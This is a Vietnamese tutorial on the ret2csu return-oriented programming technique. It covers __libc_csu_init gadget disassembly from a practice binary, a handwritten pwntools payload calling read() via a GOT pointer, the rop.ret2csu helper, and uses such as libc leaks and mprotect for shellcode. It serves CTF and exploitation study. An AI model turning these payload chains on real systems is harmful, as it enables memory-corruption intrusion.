# ret2csu — gọi hàm nhiều tham số khi thiếu gadget

> Tài liệu học sâu (không phải cheatsheet tra nhanh). Mọi disassembly & output pwntools dưới đây
> **lấy từ binary thật đã verify** (`bof6`, dynamic no-PIE, pwntools 4.15). Nguồn tham khảo ở cuối.

---

## 1. ret2csu giải quyết vấn đề gì?

x86-64 truyền tham số hàm qua thanh ghi: **`rdi`** (arg1), **`rsi`** (arg2), **`rdx`** (arg3),
`rcx`, `r8`, `r9`. Để gọi một hàm bằng ROP, bạn cần nạp các thanh ghi này rồi `ret` vào hàm.

- `pop rdi ; ret` gần như binary nào cũng có → set arg1 dễ.
- Nhưng **`pop rsi ; ret`** và nhất là **`pop rdx ; ret`** thường **KHÔNG có** trong binary nhỏ.

Vậy làm sao gọi `read(0, buf, 0x100)`, `write(1, addr, 8)`, `mprotect(page, len, 7)`,
`execve(path, argv, envp)` — những hàm cần 2–3 tham số? **ret2csu** mượn **một cặp gadget "vạn
năng"** nằm sẵn trong hàm `__libc_csu_init` để set được cả `rsi` và `rdx` cùng lúc.

> Nói ngắn: *ret2csu = cặp gadget có sẵn trong mọi ELF liên kết động cổ điển, cho phép set
> rdi/rsi/rdx và gọi một hàm qua con trỏ — kể cả khi binary không có `pop rsi/pop rdx`.*

---

## 2. `__libc_csu_init` là gì, vì sao "vạn năng"?

Đây là hàm khởi tạo do toolchain chèn vào **mọi binary liên kết động "cổ điển"** (glibc trước
bản vá ~2021). Nhiệm vụ của nó là chạy mảng constructor (`.init_array`) trước `main`. Tình cờ,
code của nó chứa **một cặp gadget hoàn hảo** để điều khiển tham số.

Vì hàm này:
- **luôn có mặt** (bạn không viết, nó tự được chèn),
- nằm trong **ảnh của binary** (no-PIE → địa chỉ **cố định**, không cần leak),

→ nên gọi là *universal gadget*. (Cảnh báo quan trọng ở §9: glibc mới đã **bỏ** cặp gadget này.)

---

## 3. Disassembly thật (bof6)

```asm
0000000000401380 <__libc_csu_init>:
  ...
  ; ===== GADGET 2 (gadget "gọi") — vào đây ở 0x4013c0 =====
  4013c0: mov    rdx, r14            ; rdx (arg3) <- r14
  4013c3: mov    rsi, r13            ; rsi (arg2) <- r13
  4013c6: mov    edi, r12d           ; edi (arg1, CHỈ 32-bit thấp) <- r12d
  4013c9: call   QWORD PTR [r15+rbx*8]; GỌI hàm tại ô nhớ [r15 + rbx*8]
  4013cd: add    rbx, 1              ; rbx++
  4013d1: cmp    rbp, rbx            ; so rbp với rbx
  4013d4: jne    4013c0              ; còn khác -> lặp lại GADGET 2 (gọi tiếp!)
  ; ===== GADGET 1 (gadget "pop") — vào đây ở 0x4013da =====
  4013d6: add    rsp, 8              ; bỏ 1 qword
  4013da: pop    rbx                 ;
  4013db: pop    rbp                 ;
  4013dc: pop    r12                 ; nạp 6 thanh ghi từ stack
  4013de: pop    r13                 ;
  4013e0: pop    r14                 ;
  4013e2: pop    r15                 ;
  4013e4: ret
```

Hai "gadget" thực ra là **hai điểm nhảy vào cùng một đoạn code**:

| Gadget | Địa chỉ (bof6) | Làm gì |
|--------|----------------|--------|
| **Gadget 1 "pop"** | `0x4013da` | `pop rbx;rbp;r12;r13;r14;r15; ret` → nạp 6 thanh ghi |
| **Gadget 2 "gọi"** | `0x4013c0` | `mov rdx,r14; mov rsi,r13; mov edi,r12d; call [r15+rbx*8]; ...` |

---

## 4. Cách hoạt động — từng bước

Ý tưởng: **Gadget 1 nạp sẵn 6 thanh ghi**, rồi `ret` sang **Gadget 2** để nó chuyển các thanh
ghi đó vào `rdi/rsi/rdx` và gọi hàm.

Thứ tự `pop` của Gadget 1 là: `rbx → rbp → r12 → r13 → r14 → r15`. Ta nạp:

| Thanh ghi | Nạp giá trị | Vì sao |
|-----------|-------------|--------|
| `rbx` | **0** | để `call [r15+rbx*8]` = `call [r15]`; và điều khiển vòng lặp |
| `rbp` | **1** | để qua được `cmp rbp,rbx` (xem dưới) |
| `r12` | **arg1** | Gadget 2 làm `mov edi, r12d` → arg1 |
| `r13` | **arg2** | `mov rsi, r13` → arg2 |
| `r14` | **arg3** | `mov rdx, r14` → arg3 |
| `r15` | **&hàm** (con trỏ GOT) | `call [r15+rbx*8]` = `call [r15]` → gọi hàm |

**Vòng lặp — vì sao `rbx=0`, `rbp=1`:** sau `call`, code chạy `add rbx,1` (rbx: 0→1) rồi
`cmp rbp,rbx`. Nếu `rbp == rbx` thì `jne` **không nhảy** → thoát, chạy tiếp xuống phần `pop`.
Đặt `rbp=1` khiến sau đúng **một** lần gọi, `rbx` thành 1 = `rbp` → thoát. Nếu `rbp≠1`, nó sẽ
**gọi hàm lại nhiều lần** với `rbx` tăng dần → `call [r15+rbx*8]` trỏ sai → hỏng.

**Sau khi hàm chạy xong:** `add rsp,8` (bỏ 1 qword) rồi `pop rbx..r15` (6 qword) rồi `ret`.
Nghĩa là **sau Gadget 2 trong payload phải chừa 7 qword rác** (1 + 6) trước gadget kế tiếp.

---

## 5. Ba ràng buộc PHẢI nhớ

1. **`call [r15+rbx*8]` gọi QUA CON TRỎ.** `r15` phải trỏ tới **ô nhớ chứa địa chỉ hàm** — tức
   một **GOT entry** (`exe.got.read`), hoặc một vùng ghi được mà bạn đã đặt địa chỉ hàm vào.
   **KHÔNG** đưa địa chỉ hàm trực tiếp vào `r15` (sẽ gọi vào giá trị rác).
2. **`mov edi, r12d` chỉ set 32-bit THẤP của `rdi`.** Dùng được cho arg1 là số nhỏ (`fd` 0/1,
   cờ, len nhỏ). Cần arg1 là **địa chỉ 64-bit đầy đủ** (vd con trỏ `/bin/sh`) → ret2csu **không
   làm được** phần đó, phải có `pop rdi` thật cho arg1.
3. **Chừa 7 qword rác sau Gadget 2** (`add rsp,8` + 6 `pop`) trước gadget tiếp theo. Quên là
   lệch cả chain.

> Biến thể: binary khác có thể nối khác — ví dụ `call [r12+rbx*8]` (con trỏ ở `r12`), hoặc
> `edi` lấy từ `r13d`. **Luôn disassemble `__libc_csu_init` của binary bạn** trước khi áp mapping.

---

## 6. Dựng chain THỦ CÔNG (để hiểu bản chất)

Ví dụ muốn gọi `read(0, bss, 0x100)` (đọc 0x100 byte vào `.bss`):

```python
from pwn import *
context.binary = exe = ELF("./bof6", checksec=False)

GADGET1 = 0x4013da      # pop rbx;rbp;r12;r13;r14;r15; ret
GADGET2 = 0x4013c0      # mov rdx,r14; mov rsi,r13; mov edi,r12d; call [r15+rbx*8]; ...
bss     = exe.bss(0x100)
OFFSET  = 72            # khoảng cách tới ret (ví dụ)

payload = flat(
    cyclic(OFFSET),
    GADGET1,
    0,              # rbx = 0
    1,              # rbp = 1
    0,              # r12 -> edi = 0      (arg1 = fd 0)
    bss,            # r13 -> rsi = bss    (arg2 = buf)
    0x100,          # r14 -> rdx = 0x100  (arg3 = len)
    exe.got.read,   # r15 -> [r15] = read()   (CON TRỎ GOT, không phải exe.plt.read)
    GADGET2,
    0,0,0,0,0,0,0,  # 7 qword rác: add rsp,8 (1) + pop rbx/rbp/r12/r13/r14/r15 (6)
    exe.sym.main,   # gadget kế: quay lại main (hoặc tiếp tục chain)
)
```

Đọc payload từ trên xuống = đúng thứ tự máy chạy: nạp 6 thanh ghi → vào Gadget 2 set
rdi/rsi/rdx → `call [r15]` = `read(0, bss, 0x100)` → dọn 7 qword → `ret` về `main`.

---

## 7. Dùng pwntools (`rop.ret2csu`) — đã verify

pwntools tự tìm Gadget 1/2, tự đặt `rbx=0 rbp=1`, tự chèn 7 qword rác. Bạn chỉ khai báo giá trị
tham số + con trỏ `call`:

```python
rop = ROP(exe)
rop.ret2csu(edi=0, rsi=bss, rdx=0x100, call=exe.got.read)   # read(0, bss, 0x100)
payload = flat(cyclic(OFFSET), rop.chain())
```

`rop.dump()` thực tế trên bof6 (xác nhận mapping & 7 qword rác):
```
0x0000:   0x4013da                 <- GADGET1 (pop chain)
0x0008:   0x0                      rbx = 0
0x0010:   0x1                      rbp = 1
0x0018:   0x1                      r12 -> edi (ở đây ví dụ edi=1)
0x0020:   0x402000                 r13 -> rsi
0x0028:   0x8                      r14 -> rdx
0x0030:   0x403fe0 got.read        r15 -> [r15] = read
0x0038:   0x4013c0                 <- GADGET2 (mov.. ; call [r15+rbx*8])
0x0040:   b'qaaaraaa' <add rsp, 8> ┐
0x0048:   b'saaataaa' rbx          │
0x0050:   b'uaaavaaa' rbp          │ 7 qword rác pwntools tự chèn
0x0058:   ... r12 / r13 / r14 / r15┘
```
Chữ ký: `rop.ret2csu(edi=, rsi=, rdx=, rbx=, rbp=, r12=, r13=, r14=, r15=, call=None)`. Thường chỉ
cần `edi/rsi/rdx/call`; pwntools lo phần còn lại.

---

## 8. Dùng ret2csu để làm gì (mẫu thực chiến)

csu **không set được `rax`** → không trực tiếp bắn `syscall execve` để ra shell. Vai trò điển hình:

- **Leak libc:** `write(1, exe.got.puts, 8)` (hoặc `puts(exe.got.puts)` — nhưng puts chỉ 1 tham
  số, khỏi cần csu). csu hợp khi cần `write(fd, addr, len)` (3 tham số).
- **Ghi dữ liệu vào bộ nhớ:** `read(0, bss, N)` để nạp `"/bin/sh"` + chain kế vào `.bss`, rồi
  stack pivot sang đó (ghép với [rop.migrate](pwntools/rop.md#migrate--stack-pivot)).
- **mprotect:** `mprotect(page, len, 7)` bật RWX rồi nhảy vào shellcode (ghép `pop rdi` cho arg1
  nếu `page` là địa chỉ 64-bit — nhớ ràng buộc §5.2).
- Nói chung: **gọi bất kỳ hàm 2–3 tham số** khi thiếu `pop rsi/pop rdx`.

Muốn ra shell thường **ghép**: csu (set args) + gadget set `rax` + `syscall`, hoặc chuyển hướng
sang **[SROP](pwntools/rop.md#srop--sigreturnframe)** / **[ret2dlresolve](pwntools/rop.md#ret2dlresolve)**.

---

## 9. Khi nào KHÔNG dùng được + cách kiểm tra

- **glibc mới (~2021+)**: bản vá (glibc bug BZ#23323, trích chính paper ret2csu) đã **rút gọn
  startup code** → nhiều binary mới **không còn** cặp gadget này. Binary **static hiện đại**
  (vd `bof4`) cũng có thể không có → `rop.ret2csu` báo thiếu gadget.
- **PIE**: địa chỉ `__libc_csu_init` bị random → phải **leak base binary trước** rồi mới dùng.
- no-PIE + dynamic cổ điển = điều kiện lý tưởng (địa chỉ cố định, không cần leak).

**Kiểm tra binary có cặp gadget không:**
```bash
objdump -d -M intel ./bin | grep -A30 '<__libc_csu_init>:'
# tìm:  mov edi, r12d   +   call QWORD PTR [r15+rbx*8]   +   dãy pop rbx..r15
```
Không thấy `__libc_csu_init` → thử gadget khác: `ROPgadget --binary ./bin | grep 'pop rsi'`,
hoặc chuyển hướng ret2dlresolve/SROP.

---

## 10. Checklist dựng ret2csu

1. Disassemble `__libc_csu_init`, ghi lại **địa chỉ Gadget 1 (pop)** và **Gadget 2 (mov+call)**.
2. Xác định mapping của **chính binary** (r12/r13/r14 → arg nào; con trỏ call ở `r15` hay `r12`).
3. Chọn hàm cần gọi + con trỏ GOT của nó cho thanh ghi "call".
4. Nạp `rbx=0, rbp=1`, các thanh ghi arg, và con trỏ GOT.
5. Sau Gadget 2 chừa **7 qword rác** rồi tới gadget kế.
6. Nhớ: arg1 chỉ 32-bit (`edi`); arg1 là địa chỉ 64-bit → cần `pop rdi` thật.
7. `print(rop.dump())` đối chiếu trước khi gửi.

---

## 11. Luyện tập

- **ROP Emporium – "ret2csu"**: bài chuẩn để tập (phải set `rdx` không có `pop rdx`).
- Binary local có csu để nghịch: `bof6`, `bof1`, `bof9`, `fmtstr2`... (xem §3 cách disassemble).

---

## Nguồn tham khảo

- Hector Marco-Gisbert, Ismael Ripoll-Ripoll — *"return-to-csu: A New Method to Bypass 64-bit
  Linux ASLR"*, Black Hat Asia 2018 (paper gốc).
  <https://www.blackhat.com/asia-18/briefings.html> ·
  [PDF mirror](https://dustri.org/b/paper-notes-return-to-csu-a-new-method-to-bypass-64-bit-linux-aslr.html)
- ir0nstone — *Binary Exploitation Notes: ret2csu* (giải thích sư phạm nhất):
  <https://ir0nstone.gitbook.io/notes/types/stack/ret2csu/exploitation>
- HackTricks — *ret2csu*: <https://book.hacktricks.xyz/binary-exploitation/rop-return-oriented-programing/ret2csu>
- ROP Emporium — *ret2csu challenge*: <https://ropemporium.com/>
- glibc BZ#23323 (bản vá bỏ gadget): <https://sourceware.org/bugzilla/show_bug.cgi?id=23323>
